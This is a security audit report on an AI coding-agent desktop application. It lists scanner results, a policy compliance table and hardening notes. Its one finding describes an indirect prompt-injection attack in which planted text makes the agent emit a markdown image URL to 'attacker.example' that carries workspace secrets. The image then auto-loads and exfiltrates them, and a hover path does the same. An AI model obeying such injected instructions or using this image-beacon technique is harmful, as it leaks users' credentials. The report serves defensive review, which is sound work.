# c0wrk — Security Review

> Audit report produced against [`SECURITY.md`](./SECURITY.md). SECURITY.md is the *policy*; this file is the
> *compliance and vulnerability assessment*. Findings are ordered by CVSS v4.0 score, descending.

| Field | Value |
| --- | --- |
| Repository | `github.com/v0lka/c0wrk` |
| Revision reviewed | `0aea84d07b2bee8ff227aa3f76d7da56c97f102d` (`main`, 2026-10-20 07:29:53 +0300) |
| Working tree | Clean; one untracked directory `tmp_ovprobe/` (not part of the review) |
| Scope | Whole repository: Go `core/`, `backend/`, `desktop/`, `internal/`, root `main.go`; React/TypeScript `frontend/` |
| Policy inputs | `SECURITY.md` (all 483 lines: threat model, trust boundaries, ASI01–ASI10, secure-coding rules, agent rules, config files), `AGENTS.md` |
| Scanners | `govulncheck` v1.7.0 (Go 1.27.2), `npm audit` (npm 12.0.2 / Node 20.20.2) |
| Review status | In progress — this iteration covers the scope listed in §6; a final fresh pass over the same scope is pending |

---

## 1. Scope & Methodology

### 1.1 What was reviewed

The audit is a **full-path audit** (not a diff review) over the repository at the revision above:

- Go: 882 `.go` files under `core/`, `backend/`, `desktop/`, `internal/` and the root package.
- Frontend: 998 `.ts`/`.tsx` files under `frontend/src`.
- Configuration and build inputs that carry security policy: `go.mod`/`go.sum`, `frontend/package.json` +
  `package-lock.json`, `desktop/csp.go`, `.golangci.yml`, `.github/workflows/`.

`SECURITY.md` was treated as a binding input, not background reading: the threat model (assets, actors,
attack surface, trust boundaries, accepted trade-offs), the ASI01–ASI10 rules, and the "Secure Coding
Guidelines" / "Rules for AI Coding Agents" sections were each used as acceptance criteria for the code.

### 1.2 Method

1. **Scanners first** (§2), then verification of every result before it could become a finding.
2. **Entry-point tracing.** For each untrusted input in the policy's attack-surface list — agent prompt
   text, tool output, workspace files, `AGENTS.md`/`.agents/**`, MCP tool descriptions and output, git
   repository metadata, dropped/pasted attachments, paper HTML, external feeds — the path to a sink
   (filesystem, process spawn, SQL, network, HTML sink, confirmation gate) was traced in code.
3. **Enforcement-core review.** The c0wrk-specific security chokepoints were read end to end rather than
   sampled: the tool-policy funnel (`core/tools/registry.go`), the unattended path
   (`registry_unattended.go`), the symlink/worktree gates, the autonomy-posture reducer, git subprocess
   hardening, archive extraction, download verification, TLS pinning, OAuth loopback flow, and the
   sanitizer/CSP pair on the frontend.
4. **Domain coverage.** OWASP Top 10 for Web Applications (2021/2025), OWASP Top 10 for Agentic
   Applications (ASI01–ASI10), business-logic errors (spec-vs-code), and data races/TOCTOU were all in
   scope; §6 records which parts of each domain were actually exercised and which were not.
5. **Evidence standard.** A finding required a named actor, an entry point, a step sequence referencing
   real code, and a concrete impact. Anything that could not be proven is listed as a hardening note or a
   coverage gap — never as a scored finding.

### 1.3 Limitations

- Static review only: no exploit was executed against a running desktop build, and the webview behaviour
  (CSP enforcement, image loading) is reasoned from the configured policy and the platform's documented
  semantics, not observed on a live `wails dev` session.
- `govulncheck` and `npm audit` cover published vulnerabilities; they do not cover logic flaws.
- `github.com/v0lka/sp4rk` is an external module. Calls into it were reviewed at the boundary (arguments,
  fail-closed expectations, attached analysis), but its internals are outside this repository's scope.

---

## 2. Scanner Results

Both required scanners were executed at the reviewed revision.

| Scanner | Version | Command | Result |
| --- | --- | --- | --- |
| `govulncheck` | v1.7.0 (Go 1.27.2; DB `https://vuln.go.dev`, updated 2026-10-20 00:20:56 UTC) | `GOWORK=off go run golang.org/x/vuln/cmd/govulncheck@v1.7.0 ./...` | **No vulnerabilities found** — exit code 0 |
| `npm audit` | npm 12.0.2, Node 20.20.2 | `npm audit --json` in `frontend/` | **0 vulnerabilities** — 824 dependencies (393 prod, 431 dev, 76 optional) |

Verification notes:

- `govulncheck` was re-run with `-show=verbose` to confirm it actually loaded the module graph; it listed the
  scanned module set (including `modernc.org/sqlite@v1.47.0`, `golang.org/x/net@v0.60.0`,
  `mvdan.cc/sh/v3@v3.10.0`, `github.com/wailsapp/wails/v2@v2.16.0`) and then reported
  `No vulnerabilities found.` with exit status 0. `GOWORK=off` was used so the result reflects the pinned
  `go.mod` rather than the local `go.work` (which adds `../sp4rk`).
- `npm audit` completed with exit status 0. npm 12.0.2 printed a support warning for Node 20.20.2
  (`does not support Node.js v20.20.2`); the audit nevertheless resolved the full lockfile graph and
  returned a valid `auditReportVersion: 2` payload with zero findings. The toolchain mismatch is a
  reproducibility caveat for CI parity, not a security result.

No scanner output required downgrading: there were no unverified advisories.

---

## 3. Policy Compliance

Rules from `SECURITY.md` that were checked against the code, and the verdict. "Verified" means the
enforcement path was read in code and, where the repository provides one, is covered by a test.

| Policy rule | Verdict | Evidence |
| --- | --- | --- |
| Path containment through the centralized API (no inline `HasPrefix`/`filepath.Rel` checks) | Compliant in reviewed code | Repository-wide search for inline containment found only a **test** assertion; production code uses `pathutil.IsWithinPath` / `config.IsWithinPath` (e.g. `core/papers/writer.go#L249`, `core/updater/installer.go#L163-L175`) |
| Parameterized SQL only | Compliant | No string-interpolated SQL found; the only `+` in a query is a constant column list in `backend/session/persistence.go#L564` |
| No shell string concatenation; discrete argv | Compliant | No `sh -c`/`bash -c` built from variables in production code; `exec.CommandContext` call sites pass typed argv (`backend/frontend_api_papers_literature.go#L242-L262` passes the seed after a `--` terminator) |
| Tool-group policy: mutating groups default `user_confirm`; undeclared group fails closed | Compliant | `core/tools/registry.go#L939-L1150`: deny → hard reasons → workspace auto-approve (only for `local_write`, only when the tool's own judge allows) → judge/confirm |
| `GroupSystem` bypass is reserved | Compliant | Gate 3 bypasses policy only for `sdktools.GroupSystem`; no new system tool observed in the reviewed funnel |
| Canonical hard reasons can never be auto-approved on interactive paths | Compliant | Deterministic backstop in `smartApproveOrConfirm` (`registry.go#L1470-L1485`) keyed on `JudgeOutcome.ReasonCode`; silent-mode exception is explicit and opt-in |
| `ExecuteUnattended` keeps every hard gate | Compliant | `core/tools/registry_unattended.go#L70-L116`: validation, disabled tools, deny group, canonical judge/symlink/worktree reasons |
| Autonomy posture may only tighten mid-task | Compliant | `ApplyAutonomyPostureIfTightening` + per-field permissiveness ranking (`registry.go#L683-L796`) |
| Git only via hardened spawn; repo config never trusted; no scan caching | Compliant | `internal/sysproc` baseline, `core/workspace.GitCmdInRepo` re-scan, include-bearing fail-closed path, `safeJoin`/`safeCreateSymlink` were reviewed |
| Option injection on git operands | Compliant | `validateGitOperand` rejects leading `-` and is applied to branch, remote, tag and remote-branch operands (`backend/frontend_api_git.go#L700-L2415`); SHAs are regex-validated |
| Archive extraction: zip-slip / tar-slip / symlink escape / size caps | Compliant | `safeJoin`, `safeCreateSymlink`, `maxExtractEntryBytes` in `core/updater/installer.go#L501-L735`; tar symlinks skipped |
| Runtime downloads SHA256-verified fail-closed | Compliant | `core/toolmanager/download.go#L105-L225` (missing checksum = refusal), `core/embeddedllm/registry.go` pins + `VerifyFile` |
| Secrets never written in plaintext; `${ENV}` stays symbolic | Compliant | `config.Save` marshals as-is (`backend/config/config.go#L3177`), env vars expanded at use time (`ExpandEnvVars`), config written `0o600`, OAuth tokens in the OS keychain (`backend/providerauth/store.go`) |
| No `InsecureSkipVerify` without a compensating verifier | Compliant | Two deliberate uses in `core/llmtls/llmtls.go`: pin-only transport always installs `VerifyPeerCertificate` (`pinVerifier`, fails on empty cert / mismatch) and the fingerprint probe only reads a certificate and sends no request or key |
| XSS: no raw untrusted HTML | Compliant — with the one gap reported as Finding 1 | Paper HTML goes through `hast-util-sanitize` + `toJsxRuntime` (React elements, no `innerHTML`); Mermaid is `securityLevel: 'strict'` + DOMPurify SVG profile; `ansi_up` 6.0.6 escapes HTML and allowlists `http`/`https` hyperlinks |
| Agent rule 3: untrusted output never marked trusted | No deviation observed | MCP descriptors keep `SourceCategoryMCP`; the dispatch gate is keyed on the server source |
| Agent rule 12: git hardening not weakened | No deviation observed | Baseline `-c` overrides intact; `.git` write gate (`git_internal_path`) present in the funnel's worktree gate |

The only policy-level conflict found is a **stated rationale** rather than a rule violation: `desktop/csp.go`
asserts that remote images are safe because "`img-src` grants no script or connect rights, so the
exfiltration channel this CSP closes (`connect-src 'self'`) stays closed". Under the project's own threat
model (indirect prompt injection, ASI01), an image URL *is* an exfiltration channel. That is Finding 1.

---

## 4. Findings

### Finding 1: Rendered markdown auto-loads attacker-supplied remote images, giving indirect prompt injection a silent exfiltration channel

- **Severity:** High — CVSS 4.0 `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N`
  (band 7.0–8.9; no CVSS 4.0 calculator was available in the review environment, so the vector is the
  authoritative artifact and the numeric score is intentionally not asserted)
  - `AV:N` — the injected content and the exfiltration endpoint are both remote (a cloned repository, a web
    page the agent fetches, an MCP server's description/output).
  - `AC:L` — no race, no special configuration, no timing window.
  - `AT:P` — exploitation requires the injected content to be rendered (model compliance for the assistant
    path, a hover for the mention-tooltip path); the rendering and the fetch themselves are deterministic.
  - `PR:N`, `UI:N` — no credentials, and no click: chat messages and thought blocks render automatically.
  - `VC:H` — workspace secrets (`.env`, CI credentials, tokens committed by mistake) leave the machine.
  - `VI:N`, `VA:N` — nothing is modified or made unavailable.
  - `SC:N`, `SI:N`, `SA:N` — no impact on other systems' confidentiality/integrity/availability is claimed
    (the attacker's own listener receiving data is not a "subsequent system" in the CVSS 4.0 model).
- **CWE:** CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) — primary;
  CWE-693 (Protection Mechanism Failure) — supporting (the CSP rationale that this channel is closed is
  incorrect)
- **Category:** ASI01 — Agent Goal Hijacking (indirect prompt injection) / ASI06 — Memory and Context
  Poisoning; OWASP A01:2025 (Broken Access Control, data reaching an unauthorized destination)
- **Location:** [`frontend/src/lib/markdownConfig.tsx#L143-L200`](frontend/src/lib/markdownConfig.tsx#L143-L200)
  (the `<img>` sink and its resolver), [`frontend/src/lib/markdownImageResolve.ts#L10-L12`](frontend/src/lib/markdownImageResolve.ts#L10-L12)
  (`EXTERNAL_SRC_RE`), [`desktop/csp.go#L24-L48`](desktop/csp.go#L24-L48) (`img-src 'self' data: https: http:`).
  Related renderers that also auto-load images: [`MentionInfoTooltip.tsx#L66`](frontend/src/components/chat/MentionInfoTooltip.tsx#L66),
  [`ThoughtBlock.tsx#L30`](frontend/src/components/chat/ThoughtBlock.tsx#L30),
  [`AssistantMessage.tsx#L36`](frontend/src/components/chat/AssistantMessage.tsx#L36).

- **Attack scenario:**

  1. **Actor.** A prompt-injection adversary (the "Prompt-injection adversary (ASI01/ASI06)" actor in the
     threat model) who can get text in front of the model: a `README.md`/`AGENTS.md`/comment in a cloned
     repository, a `web_fetch` result, an MCP server's tool description or tool output, or a paper/library
     document.
  2. **Entry point.** The agent reads that content as part of an ordinary task. `local_read` is `allow` by
     default (`backend/config/defaults.go#L739`), so reading a workspace file — including a committed
     `.env`, `secrets.yaml`, `.npmrc`, or a CI token file — needs no confirmation.
  3. **Steps.**
     - The injected text instructs the agent to emit a markdown image whose URL carries the file contents:
       `![](https://attacker.example/p?d=<url-encoded secret>)`.
     - The message is persisted and rendered by `Markdown` → `MarkdownImage`
       (`markdownConfig.tsx#L143-L145`), which returns the external URL verbatim because
       `EXTERNAL_SRC_RE` treats any `scheme:` as external (`markdownImageResolve.ts#L10`).
     - React sets `<img src="https://attacker.example/p?d=…">`. The production CSP allows it —
       `img-src 'self' data: https: http:` (`desktop/csp.go#L48`) — and `connect-src 'self'` is irrelevant
       because an image load is not a `fetch`/XHR.
     - The webview issues the GET; the secret arrives at the attacker's listener. No confirmation card, no
       click, no visible artifact beyond one broken image.
     - A second, model-independent path reaches the same sink: the `/`-mention tooltip renders
       workspace-authored `.agents/agents/*/AGENT.md` and MCP-authored descriptions as markdown
       (`MentionInfoTooltip.tsx#L66`), so a hostile repository can put the beacon in a subagent description
       and have it fire on **hover** while the user browses the completion list.
  4. **Impact.** Confidentiality loss of any workspace file the agent can read (repository secrets are the
     realistic target; the same primitive also confirms the user's IP and viewing time). Integrity is not
     affected, and the channel survives the strict CSP because the policy deliberately allows remote images.

- **Evidence.**

  ```tsx
  // frontend/src/lib/markdownImageResolve.ts:10
  export const EXTERNAL_SRC_RE = /^(data:|[a-z][a-z0-9+.-]*:)/i

  // frontend/src/lib/markdownConfig.tsx:143-145
  function MarkdownImage({ src, alt, title, baseFilePath, workspaceRoot }: MarkdownImageProps) {
    const resolved = useMarkdownImageSrc(src, baseFilePath, workspaceRoot)
    return <img src={resolved ?? TRANSPARENT_PIXEL} alt={alt} title={title} loading="lazy" />
  }
  ```

  ```go
  // desktop/csp.go:48 — the policy permits the request the sink above creates
  "img-src 'self' data: https: http:; " +
  ```

  ```go
  // backend/config/defaults.go:739 — the read side needs no confirmation
  ToolGroupLocalRead:   GroupPolicyAllow,
  ```

  `hast-util-sanitize` does not help here: it constrains the *scheme* of `src` (http/https/data), which is
  exactly the scheme the exfiltration URL uses. The sanitizer is working as configured; the configuration is
  the problem.

- **Recommended fix:**
  a) **Deny remote images by default and localize or proxy them.** Change the production CSP to
     `img-src 'self' data:` and render remote image URLs as an inert placeholder ("remote image blocked —
     click to load"), so nothing leaves the machine until the operator asks for it. This is the only change
     that closes the channel without depending on model behaviour.
  b) If remote images must stay rendered, route them through the backend with an allowlist and caps (size,
     content type, host), and fetch them **without** the secret-bearing URL — i.e. have the renderer resolve
     `src` to an opaque, locally cached asset id so the model-authored query string never reaches the
     network.
  c) Defense in depth: add `Referrer-Policy: no-referrer` to `CSPMiddleware`, strip remote `img` sources in
     `customSanitizeSchema` (leave `data:`/`self`), and document the residual channel in `SECURITY.md`'s
     "Known Risks" table instead of asserting in `csp.go` that images are passive.
  d) For the tooltip path specifically, render mention descriptions with images disabled (a renderer variant
     with no `img` component), since a hover is not a decision by the operator.

- **Confidence:** Confirmed for the mechanism (code paths above are complete and reachable; CSP and the read
  policy are verified). The `AT:P` step — the model following the injected instruction — is probabilistic by
  nature; the hover path in `MentionInfoTooltip` needs no model compliance at all.

---

## 5. Unverified Tool Findings

None. Both scanners produced a definitive, verified-clean result (§2); no advisory was left unverified, so
no entry carries a "Probable"/"Unverified" confidence label.

---

## 6. Coverage & Gaps

### 6.1 Reviewed and found clean (evidence-backed)

| Area | What was verified |
| --- | --- |
| Tool-policy funnel (`core/tools/registry.go`) | Gate order (schema validation → disabled tools → MCP mode gate → system bypass → pre-hook → deny → shell analysis → judge/symlink/worktree reasons → auto-approve → judge/confirm); fail-closed default for tools without a judge (zero `JudgeOutcome` means no auto-approval) |
| Unattended execution (`registry_unattended.go`) | Every hard gate retained; canonical reasons block; non-canonical ⊤ limitation deliberately passes |
| Autonomy posture | Per-field permissiveness ranking; loosening is refused mid-task |
| Symlink / worktree gates | Escape-only escalation, OS-level symlink exemption, canonical reason codes |
| Git subprocess hardening | Baseline `-c` overrides, per-invocation re-scan, include-bearing fail-closed path, `GIT_ATTR_*` stripping, `.git` write gate |
| Git RPC operands | Leading-`-` rejected for branch/remote/tag; SHA regex; flag allowlists; no `--upload-pack`-style injection reachable from RPC arguments (verified experimentally: a repository *can* declare `remote."--upload-pack=…".url`, but `validateGitOperand` refuses it before `exec`) |
| Archive extraction (updater, tool-manager) | Lexical + resolved containment, symlink target validation, tar symlinks skipped, per-entry size caps |
| Supply-chain verification | Tool-manager SHA256 fail-closed (missing pin = refusal), cache-hit re-verification, embedded-LLM compile-time pins |
| TLS | Pin-only verification with a mandatory verifier; no any-certificate configuration exists; probe sends no request/key |
| OAuth (provider auth) | PKCE S256, `state` compared, secrets in OS keychain, loopback-only listeners |
| Papers (fetch/localize/write) | Host allowlist + redirect check, byte and count caps, image localization, slug validation (`ValidSlug`), containment-checked atomic writes |
| Research artifacts | `NormalizeID` regex-constrained IDs, project ownership resolution, containment-checked writes |
| Vector index walk | `!d.Type().IsRegular()` skips symlinks — a planted `notes.md -> ../../.ssh/id_rsa` is **not** indexed |
| SQL | No interpolation; only a constant column-list concatenation |
| Frontend sanitizers | `rehype-sanitize` default protocol allowlist, `hast-util-sanitize` paper schema, DOMPurify SVG profile, Mermaid `strict`, `ansi_up` 6.0.6 HTML escaping + `http`/`https` link allowlist |
| At-rest permissions | `~/.c0wrk` is `0750`; config `0600`; crash log `0640`; DB `0644` inside the `0750` directory (not readable by other users) |

### 6.2 Not yet covered (gaps for the next pass)

- **MCP gateway end-to-end** (`core/builder_mcp.go`, `core/orchestrator_mcp*.go`, `core/tools/mcp_gate.go`):
  the dispatch gate and descriptor filters were read; server lifecycle, stdio env handling, and
  `task_mcp_mentions` persistence were not traced end to end.
- **Terminal/PTY subsystem** (`core/terminal/manager.go`, `backend/frontend_api_terminal.go`): spawn,
  resize and history persistence were not audited beyond the `exec.Command` call shape.
- **Updater install/rollback flow** beyond extraction: `.old` rollback tree, `--self-update` re-exec, and
  `ErrNonStandardLocation` were only spot-checked.
- **Embedded-LLM supervisor** (`core/embeddedllm/server.go`, `transport.go`, `install.go`): the launch-spec
  argv surface and port handling were reviewed at the type level; the state machine and stop/force paths
  were not re-derived this pass.
- **Frontend stores/event ingestion**: type guards at the event boundary and `useSyncExternalStore`
  selector rules were not individually audited.
- **CodeMirror / xterm extensions, review panel diff rendering** (only the `dangerouslySetInnerHTML` sites
  were checked).
- **Data-race review**: no `-race` execution was performed in this pass; concurrency was reviewed only by
  reading lock discipline at the reviewed chokepoints.
- **Dynamic validation**: no live webview test of the CSP (Finding 1's browser behaviour is reasoned from
  the policy, not observed on a running build); no fuzzing of parsers (papers, research, git config).

### 6.3 Hardening observations (no CVSS score — not proven exploitable)

1. **`style` on `div` in the markdown sanitize schema** (`markdownConfig.tsx#L20-L40`) is unreachable today
   because raw HTML is not parsed (no `rehype-raw`), but it is an unnecessary CSS-injection surface if raw
   HTML is ever enabled. Drop `style` from the allowlist.
2. **`style-src 'unsafe-inline'`** is required by Tailwind/CodeMirror inline styles. It is safe while no
   HTML injection exists; it becomes a UI-redress primitive if one is ever introduced. Consider nonces for
   injected `<style>` elements if the requirement ever narrows.
3. **Dev-mode builds compile the CSP middleware out** (`//go:build !dev`). Expected for HMR, but a
   dev-flavoured build must never be shipped; the release pipeline should assert the tag is absent.
4. **`ReadFile` / `ReadImageAsDataURL` RPCs are intentionally not workspace-contained** (documented). They
   are only as safe as the renderer: any future XSS would turn them into arbitrary file read. Keeping the
   markdown pipeline's sanitizers intact is therefore load-bearing for those two methods.
5. **`npm audit` ran under an unsupported npm/Node combination** (npm 12.0.2 on Node 20.20.2). Results were
   valid, but CI parity should be verified so a local "clean" cannot diverge from CI.
